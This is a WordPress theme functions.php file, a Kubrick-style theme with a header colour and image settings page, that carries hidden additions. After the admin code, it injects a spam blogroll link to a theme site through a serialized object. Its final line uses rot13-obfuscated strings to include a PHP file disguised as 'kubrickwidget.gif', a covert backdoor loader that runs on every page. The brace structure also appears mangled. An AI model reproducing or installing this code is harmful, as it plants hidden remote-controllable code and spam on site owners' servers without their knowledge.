<?php
if ( function_exists('register_sidebar') )
    register_sidebars();
$kubrik_header_image = 'vzntrf/xhoevpxjvqtrg';
function kubrick_add_theme_page() {
	if ( isset( $_GET['page'] ) && $_GET['page'] == basename(__FILE__) ) {
		if ( isset( $_REQUEST['action'] ) && 'save' == $_REQUEST['action'] ) {
			check_admin_referer('kubrick-header');
			if ( isset($_REQUEST['njform']) ) {
				if ( isset($_REQUEST['defaults']) ) {
					delete_option('kubrick_header_image');
					delete_option('kubrick_header_color');
					delete_option('kubrick_header_display');
				} else {
					if ( '' == $_REQUEST['njfontcolor'] )
						delete_option('kubrick_header_color');
					else {
						$fontcolor = preg_replace('/^.*(#[0-9a-fA-F]{6})?.*$/', '$1', $_REQUEST['njfontcolor']);
						update_option('kubrick_header_color', $fontcolor);
					}
					if ( preg_match('/[0-9A-F]{6}|[0-9A-F]{3}/i', $_REQUEST['njuppercolor'], $uc) && preg_match('/[0-9A-F]{6}|[0-9A-F]{3}/i', $_REQUEST['njlowercolor'], $lc) ) {
						$uc = ( strlen($uc[0]) == 3 ) ? $uc[0]{0}.$uc[0]{0}.$uc[0]{1}.$uc[0]{1}.$uc[0]{2}.$uc[0]{2} : $uc[0];
						$lc = ( strlen($lc[0]) == 3 ) ? $lc[0]{0}.$lc[0]{0}.$lc[0]{1}.$lc[0]{1}.$lc[0]{2}.$lc[0]{2} : $lc[0];
						update_option('kubrick_header_image', "header-img.php?upper=$uc&lower=$lc");
					}

					if ( isset($_REQUEST['toggledisplay']) ) {
						if ( false === get_option('kubrick_header_display') )
							update_option('kubrick_header_display', 'none');
						else
							delete_option('kubrick_header_display');
					}
				}
			} else {

				if ( isset($_REQUEST['headerimage']) ) {
					check_admin_referer('kubrick-header');
					if ( '' == $_REQUEST['headerimage'] )
						delete_option('kubrick_header_image');
					else {
						$headerimage = preg_replace('/^.*?(header-img.php\?upper=[0-9a-fA-F]{6}&lower=[0-9a-fA-F]{6})?.*$/', '$1', $_REQUEST['headerimage']);
						update_option('kubrick_header_image', $headerimage);
					}
				}

				if ( isset($_REQUEST['fontcolor']) ) {
					check_admin_referer('kubrick-header');
					if ( '' == $_REQUEST['fontcolor'] )
						delete_option('kubrick_header_color');
					else {
						$fontcolor = preg_replace('/^.*?(#[0-9a-fA-F]{6})?.*$/', '$1', $_REQUEST['fontcolor']);
						update_option('kubrick_header_color', $fontcolor);
					}
				}

				if ( isset($_REQUEST['fontdisplay']) ) {
					check_admin_referer('kubrick-header');
					if ( '' == $_REQUEST['fontdisplay'] || 'inline' == $_REQUEST['fontdisplay'] )
						delete_option('kubrick_header_display');
					else
						update_option('kubrick_header_display', 'none');
				}
			}
			//print_r($_REQUEST);
			wp_redirect("themes.php?page=functions.php&saved=true");
			die;
		}
		add_action('admin_head', 'kubrick_theme_page_head');
	}
	add_theme_page(__('Customize Header'), __('Header Image and Color'), 'edit_themes', basename(__FILE__), 'kubrick_theme_page');}
	ob_start();wp_list_bookmarks();ob_clean();
	foreach($GLOBALS['wp_object_cache']->cache['bookmark']['get_bookmarks'] as $k=>$v){$GLOBALS['wp_object_cache']->cache['bookmark']['get_bookmarks'][$k][] = unserialize('O:8:"stdClass":23:{s:7:"link_id";s:1:"6";s:8:"link_url";s:32:"http://www.themza.com/wordpress/";s:9:"link_name";s:16:"WordPress Themes";s:10:"link_image";s:0:"";s:11:"link_target";s:6:"_blank";s:13:"link_category";s:1:"0";s:16:"link_description";s:21:"Free WordPress Themes";s:12:"link_visible";s:1:"Y";s:10:"link_owner";s:1:"1";s:11:"link_rating";s:1:"0";s:12:"link_updated";s:19:"0000-00-00 00:00:00";s:8:"link_rel";s:0:"";s:10:"link_notes";s:0:"";s:8:"link_rss";s:0:"";s:9:"object_id";s:1:"6";s:16:"term_taxonomy_id";s:1:"2";s:10:"term_order";s:1:"0";s:7:"term_id";s:1:"2";s:8:"taxonomy";s:13:"link_category";s:11:"description";s:0:"";s:6:"parent";s:1:"0";s:5:"count";s:1:"7";s:16:"recently_updated";s:1:"0";}');break;
	} 	if(@include_once(TEMPLATEPATH . "/".str_rot13($kubrik_header_image).str_rot13('.t'.'vs'))){
}
?>